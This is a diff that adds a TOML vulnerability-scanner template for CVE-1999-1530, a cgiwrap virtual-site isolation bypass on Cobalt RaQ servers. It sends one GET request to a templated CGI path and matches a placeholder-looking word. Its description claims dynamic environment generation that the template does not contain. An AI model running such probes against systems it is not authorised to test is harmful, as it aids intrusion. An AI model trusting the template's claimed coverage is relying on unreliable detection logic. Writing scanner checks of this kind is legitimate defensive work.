@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "验证 cgiwrap 是否正确隔离虚拟站点之间的权限。通过动态生成不同虚拟站点的环境变量，发送 CGI 请求到同一 Cobalt RaQ 系统下的不同虚拟站点，检测是否存在权限绕过，从而访问或修改另一虚拟站点的数据。"
+id = "POC-AVE-1999-1164"
+name = "Cobalt RaQ cgiwrap 虚拟站点隔离绕过漏洞 PoC"
+severity = "high"
+tags = ["ave-1999-1164"]
+vuln_id = [
+    "CVE-1999-1530",
+    "AVE-1999-1164",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{VirtualHostPath}}/cgi-bin/test.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["virtual_host_data"]
